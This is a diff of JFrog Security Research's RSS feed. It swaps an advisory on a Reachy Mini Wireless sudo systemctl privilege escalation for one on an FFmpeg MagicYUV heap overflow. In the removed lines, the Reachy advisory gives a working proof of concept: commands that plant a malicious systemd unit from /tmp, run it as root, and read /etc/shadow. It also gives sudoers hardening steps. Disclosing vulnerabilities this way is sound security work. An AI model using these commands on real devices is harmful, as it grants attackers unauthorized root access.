@@ -4,7 +4,7 @@
         <title>JFrog Security Research</title>
         <link>https://research.jfrog.com</link>
         <description>Homepage feed: latest vulnerabilities and security research posts from JFrog Security Research.</description>
-        <lastBuildDate>Wed, 29 Jul 2026 00:38:40 GMT</lastBuildDate>
+        <lastBuildDate>Wed, 29 Jul 2026 09:23:46 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Home RSS</generator>
         <language>en</language>
@@ -1384,128 +1384,37 @@ JFrog Curation customers are protected, as the malicious package versions have b
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[The Reachy Mini Wireless image is vulnerable to a Local Privilege Escalation via an Unrestricted sudo systemctl Grant]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/the-reachy-mini-wireless-image-is-vulnerable-to-a-local-privilege-escalation-via-an-unrestricted-sudo-systemctl-grant-jfsa-2026-001667223/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/the-reachy-mini-wireless-image-is-vulnerable-to-a-local-privilege-escalation-via-an-unrestricted-sudo-systemctl-grant-jfsa-2026-001667223/</guid>
-            <pubDate>Mon, 15 Jun 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-53605, HIGH, The Reachy Mini Wireless image is vulnerable to a Local Privilege Escalation via an Unrestricted sudo systemctl Grant]]></description>
+            <title><![CDATA[FFmpeg is vulnerable to a Heap Out-of-Bounds Write in the MagicYUV Decoder (PixelSmash)]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/ffmpeg-is-vulnerable-to-a-heap-out-of-bounds-write-in-the-magicyuv-decoder-cve-2026-8461/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/ffmpeg-is-vulnerable-to-a-heap-out-of-bounds-write-in-the-magicyuv-decoder-cve-2026-8461/</guid>
+            <pubDate>Thu, 18 Jun 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-8461, HIGH, FFmpeg is vulnerable to a Heap Out-of-Bounds Write in the MagicYUV Decoder (PixelSmash)]]></description>
             <content:encoded><![CDATA[
 ## Summary
 
-The Reachy Mini Wireless image is vulnerable to a Local Privilege Escalation via an Unrestricted sudo systemctl Grant
+FFmpeg is vulnerable to a Heap Out-of-Bounds Write in the MagicYUV Decoder (PixelSmash)
 
 
 ## Component
 
-reachy-mini-os
+ffmpeg (libavcodec/magicyuv.c)
 
 ## Affected versions
 
-< 0.2.4
+< 8.1.2
 
 ## Description
 
-The Reachy Mini Wireless image ships the daemon user (pollen) with a passwordless sudoers entry for /usr/bin/systemctl that carries no subcommand or argument restriction. An attacker who obtains code execution as pollen, for example, could escalate to full root in three commands, with no additional vulnerability required. 
-
-## PoC
-
-<br>
-
-**Step 1 - Confirm the sudoers grant**
-
-<br>
-
-```sudo -n -l 2>&1 | grep systemctl```
-
-<br>
-
-Expected output:
-
-```(ALL) NOPASSWD: /usr/bin/systemctl```
-
-<br>
-
-If the output shows a restricted form such as /usr/bin/systemctl restart reachy-mini-daemon, the escalation is blocked - skip to Impact.
-
-<br>
-
-**Step 2 - Write the malicious unit file**
-
-<br>
-
-From a raw nc/reverse shell where heredoc and multi-line paste may not work, use printf to write the file in a single command:
-
-`printf '[Unit]\nDescription=privesc\n\n[Service]\nType=oneshot\nExecStart=/tmp/.pwn.sh\nRemainAfterExit=no\n\n[Install]\nWantedBy=multi-user.target\n' > /tmp/.pwn.service`
-
-<br>
-
-Write the payload script separately (avoids quoting issues in ExecStart):
-
-`printf '#!/bin/sh\nid > /tmp/.pwn_proof.txt\nhead -1 /etc/shadow >> /tmp/.pwn_proof.txt\necho CHAIN_COMPLETE >> /tmp/.pwn_proof.txt\n' > /tmp/.pwn.sh
-chmod +x /tmp/.pwn.sh`
-
-<br>
-
-/tmp is world-writable. Both files are owned by pollen:pollen. No elevated privilege is needed for this step.
-
-<br>
-
-**Step 3 - Link and start the unit**
-
-```
-sudo /usr/bin/systemctl link /tmp/.pwn.service
-sudo /usr/bin/systemctl daemon-reload
-sudo /usr/bin/systemctl start .pwn.service
-Expected output from the link command:
-Created symlink /etc/systemd/system/.pwn.service -> /tmp/.pwn.service.
-```
-
-<br>
-<br>
-
-**Step 4 - Verify root execution**
-
-```
-cat /tmp/.pwn_proof.txt
-Expected output:
-uid=0(root) gid=0(root) groups=0(root)
-root:*:20578:0:99999:7:::
-CHAIN_COMPLETE
-The first line proves ExecStart ran as uid 0. The second line is the first entry of /etc/shadow - readable only by root - confirming full root filesystem access.
-```
+A heap-based out-of-bounds write exists in the MagicYUV decoder (libavcodec/magicyuv.c). magy_decode_frame reads slice_height from the bitstream and validates it only against INT_MAX. When slice_height has low bits that are not aligned to the chroma vertical subsampling factor (vshift), the per-slice chroma destination pointer computed via AV_CEIL_RSHIFT rounds up on every slice, so the cumulative row offset exceeds the chroma plane buffer size allocated by av_image_fill_plane_sizes. A crafted MagicYUV-encoded media file (AVI/MKV/MOV) can therefore write attacker-controlled data past the end of the chroma plane heap buffer when decoded. Under typical glibc heap layouts this can corrupt adjacent heap metadata and function pointers (for example AVBuffer.free), enabling denial of service and, in some environments, remote code execution. The MagicYUV decoder is enabled by default in common FFmpeg builds.
 
 ## Vulnerability Mitigations
 
-Upgrade or log in as root (or via sudo -i), then:
-
-```
-  # Remove the overly broad grant (if present)
-  rm -f /etc/sudoers.d/010_pi-nopasswd
-
-  # Install the scoped grant
-  cat > /etc/sudoers.d/010-pollen-reachy <<'EOF'
-  Cmnd_Alias REACHY = \
-      /usr/bin/systemctl restart reachy-mini-daemon, \
-      /usr/bin/systemctl restart reachy-mini-bluetooth, \
-      /usr/sbin/rfkill unblock bluetooth, \
-      /usr/sbin/rfkill unblock wifi, \
-      /usr/sbin/shutdown -h now, \
-      /bluetooth/commands/HOTSPOT.sh, \
-      /bluetooth/commands/WIFI_RESET.sh, \
-      /bluetooth/commands/SOFTWARE_RESET.sh, \
-      /bluetooth/commands/RESTART_DAEMON.sh
-  pollen ALL=(root) NOPASSWD: REACHY
-  EOF
-  chmod 0440 /etc/sudoers.d/010-pollen-reachy
-
-  # Validate the resulting sudoers configuration
-  visudo -c
-```
+Upgrade to FFmpeg 8.1.2 or later. The fix rejects slice_height values that are not aligned to the chroma vertical subsampling factor (merged in https://code.ffmpeg.org/FFmpeg/FFmpeg/pulls/23159). Until an upgrade is available, rebuild FFmpeg with `--disable-decoder=magicyuv`, or apply an equivalent guard that returns AVERROR_INVALIDDATA when `s->vshift[1] && (s->slice_height & ((1 << s->vshift[1]) - 1))`.
 
 ## References
-https://github.com/pollen-robotics/reachy-mini-os/security/advisories/GHSA-7rhg-9v48-x3h2
-
-
+https://jfrog.com/blog/pixelsmash-critical-ffmpeg-vulnerability-turns-media-files-into-weapons/
+https://code.ffmpeg.org/FFmpeg/FFmpeg/pulls/23159
+https://nvd.nist.gov/vuln/detail/CVE-2026-8461
 ]]></content:encoded>
         </item>
     </channel>
